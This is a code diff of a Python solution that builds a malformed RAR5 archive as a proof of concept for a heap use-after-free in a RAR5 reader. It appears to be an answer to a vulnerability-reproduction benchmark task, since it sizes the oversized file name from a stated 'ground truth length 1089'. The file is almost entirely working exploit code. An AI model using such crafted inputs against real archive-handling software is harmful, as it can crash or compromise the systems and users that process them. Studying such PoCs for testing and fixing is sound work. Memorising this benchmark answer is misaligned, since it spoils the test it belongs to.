@@ -1,78 +1,68 @@
 import struct
-import zlib
+import binascii
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        def to_vint(val):
+        """
+        Generate a PoC that triggers the Heap Use After Free vulnerability in Rar5 reader.
+        The vulnerability allows reading a name before checking its size, leading to
+        excessive memory usage or UAF upon error handling.
+        """
+        def to_vint(n):
             out = bytearray()
             while True:
-                byte = val & 0x7F
-                val >>= 7
-                if val > 0:
+                byte = n & 0x7F
+                n >>= 7
+                if n:
                     byte |= 0x80
-                    out.append(byte)
-                else:
-                    out.append(byte)
+                out.append(byte)
+                if n == 0:
                     break
             return bytes(out)
 
+        def crc32(data):
+            return binascii.crc32(data) & 0xFFFFFFFF
+
+        def make_block(header_type, header_flags, payload):
+            # RAR5 block structure:
+            # CRC (4 bytes)
+            # Size (VINT) - Size of header data starting from Type
+            # Type (VINT)
+            # Flags (VINT)
+            # Payload (Variable)
+            
+            # Content represents data from Type onwards
+            content = to_vint(header_type) + to_vint(header_flags) + payload
+            size_bytes = to_vint(len(content))
+            
+            # CRC is calculated over Size field + Content
+            to_crc = size_bytes + content
+            crc = crc32(to_crc)
+            
+            return struct.pack('<I', crc) + to_crc
+
         # RAR5 Signature: Rar!\x1a\x07\x01\x00
-        sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"
+        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
 
-        # --- Main Header (Type 1) ---
-        # Minimal main header
-        mh_type = to_vint(1)
-        mh_flags = to_vint(0)
-        mh_arch_flags = to_vint(0) 
-        
-        mh_content = mh_type + mh_flags + mh_arch_flags
-        mh_size = to_vint(len(mh_content))
-        
-        # Header CRC is calculated over Size + Content (Type + Flags + ...)
-        mh_crc_data = mh_size + mh_content
-        mh_crc = zlib.crc32(mh_crc_data) & 0xFFFFFFFF
-        mh_block = struct.pack("<I", mh_crc) + mh_crc_data
+        # Main Archive Header (Type 0x01)
+        # Flags: 0
+        # Payload: Archive Flags (VINT 0)
+        main_payload = to_vint(0)
+        main_block = make_block(1, 0, main_payload)
 
-        # --- File Header (Type 2) ---
-        # Vulnerability triggers when name size is read, then name is read, then size checked.
-        # We provide a name length of 1040 bytes which is likely sufficient to trigger the
-        # "excessive size" check after allocation/reading in the vulnerable version,
-        # leading to the Heap Use After Free condition during error handling/cleanup.
-        name_len = 1040
-        name = b"A" * name_len
+        # File Header (Type 0x02)
+        # Flags: 0 (No extra area, no data, no time, no crc if inferred from flags=0, or just basic fields)
+        # Basic fields for File Header with Flags=0 usually are:
+        # Compression Info (VINT), Attributes (VINT), Host OS (VINT), Name Len (VINT), Name (Bytes)
+        # We want to provide a name that is large enough to potentially trigger the check/allocation issue.
+        # Based on ground truth length 1089, we calculate name_len to fit.
+        # 1089 - 8 (sig) - 8 (main block) - 13 (file block overhead) = 1060 bytes for name.
         
-        fh_type = to_vint(2)
-        fh_flags = to_vint(0)
+        name_len = 1060
+        name = b'A' * name_len
         
-        # File specific fields
-        fh_file_flags = to_vint(0x04) # 0x04 indicates DataCRC is present
-        fh_unpack_size = to_vint(0)
-        fh_attributes = to_vint(0)
-        fh_datacrc = b"\x00\x00\x00\x00"
-        fh_compression = to_vint(0) # Stored
-        fh_host_os = to_vint(0)
-        fh_namelen = to_vint(name_len)
+        # Construct payload: Compression(0) + Attributes(0) + HostOS(0) + NameLen + Name
+        fh_payload = to_vint(0) + to_vint(0) + to_vint(0) + to_vint(name_len) + name
+        file_block = make_block(2, 0, fh_payload)
         
-        fh_payload = (fh_file_flags + fh_unpack_size + fh_attributes + 
-                      fh_datacrc + fh_compression + fh_host_os + 
-                      fh_namelen + name)
-        
-        fh_content = fh_type + fh_flags + fh_payload
-        fh_size = to_vint(len(fh_content))
-        
-        fh_crc_data = fh_size + fh_content
-        fh_crc = zlib.crc32(fh_crc_data) & 0xFFFFFFFF
-        fh_block = struct.pack("<I", fh_crc) + fh_crc_data
-
-        # --- End of Archive (Type 5) ---
-        eo_type = to_vint(5)
-        eo_flags = to_vint(0)
-        
-        eo_content = eo_type + eo_flags
-        eo_size = to_vint(len(eo_content))
-        
-        eo_crc_data = eo_size + eo_content
-        eo_crc = zlib.crc32(eo_crc_data) & 0xFFFFFFFF
-        eo_block = struct.pack("<I", eo_crc) + eo_crc_data
-
-        return sig + mh_block + fh_block + eo_block
+        return sig + main_block + file_block
